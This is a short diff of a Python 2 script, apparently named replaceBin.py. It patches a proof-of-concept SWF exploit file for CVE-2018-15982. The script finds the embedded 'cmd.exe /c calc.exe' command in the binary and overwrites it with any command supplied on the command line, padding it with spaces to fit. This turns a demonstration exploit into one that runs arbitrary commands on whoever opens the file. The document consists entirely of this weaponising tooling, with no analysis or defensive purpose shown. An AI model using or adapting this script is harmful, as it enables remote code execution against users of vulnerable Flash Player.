@@ -2,8 +2,8 @@
 # -*- coding: UTF-8 -*-
 import sys
 import getopt
-
-# C:\WINDOWS\system32\cmd.exe /c
+# fix: no pop cmd.exe
+xCmd1=b'C:\WINDOWS\system32\cmd.exe /c calc.exe'
 # py2 tools/replaceBin.py -i /mysvn/CVE-2018-15982_PoC.swf -o /mysvn/test.swf -c 'notepad.exe'
 inputfile = ''
 outputfile = ''
@@ -29,14 +29,14 @@ for opt, arg in opts:
 f=open(inputfile,"rb")
 # print("["+cmd+"]")
 xPay=bytes(cmd)
+if len(xPay) < len(xCmd1):
+    xPay=xPay+b'\x20' * (len(xCmd1) - len(xPay))
 s=f.read()
 f.close()
 x1=b'calc.exe'
 x1=x1 + b'\x20' * (len(xPay) - len(x1))
-s=s.replace(x1,bytes(xPay))
-# xx=b'\x63\x61\x6C\x63\x2E\x65\x78\x65'
-# print(s.find(x1))
-# print(s.find(b'calc.exe'))
+# s=s.replace(x1,bytes(xPay))
+s=s.replace(xCmd1,bytes(xPay))
 
 f1=open(outputfile,"wb")
 f1.write(bytes(s))
